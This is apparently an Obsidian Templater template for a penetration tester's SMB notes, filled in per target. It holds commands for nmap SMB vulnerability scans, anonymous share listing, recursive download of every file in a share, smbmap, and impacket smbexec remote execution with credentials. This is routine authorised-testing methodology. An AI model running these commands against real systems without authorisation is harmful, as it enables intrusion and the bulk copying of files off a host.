<%-*
if ( tp.frontmatter.current_port  == undefined) {
	tp.frontmatter.current_port = await tp.system.prompt('Enter port number: ')
}
-%>
# SMB - <% tp.frontmatter.current_port %>
<%*
let different_port = ""
let smbMap_different_port = ""
let smbexec_different_port = ""

if (parseInt(tp.frontmatter.current_port) != 445) {
	different_port = `--port=${tp.frontmatter.current_port}`
	smbMap_different_port = `-P ${tp.frontmatter.current_port}`
	smbexec_different_port = `-port ${tp.frontmatter.current_port}`
}
-%>
#### Nmap
```nmap
nmap -p<% tp.frontmatter.current_port %> --script smb-vuln-* <% tp.frontmatter.target_ip %>
```

#### SMBClient
```SMB
smbclient -N -L //<% tp.frontmatter.target_ip %> <% different_port %>
```

#### Download all
```bash
#Download all
smbclient //<% tp.frontmatter.target_ip %>/<share> <% different_port %>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```

#### SMBMAP
```smbmap
smbmap -H <% tp.frontmatter.target_ip %> <% smbMap_different_port %>
```


#### SMBMAP for domain
```bash
smbmap -H <% tp.frontmatter.target_ip %> -d <% tp.frontmatter.domain %>
```

#### smbexec
(If using kali try `impacket-smbexec`)
```smbexec
python smbexec.py <% tp.frontmatter.domain %>/<user>:<password>@<% tp.frontmatter.target_ip %> <% smbexec_different_port %>
```

#### smbexec w/out domain
```smbexec
python smbexec.py <user>:<password>@<% tp.frontmatter.target_ip %> <% smbexec_different_port %>
```
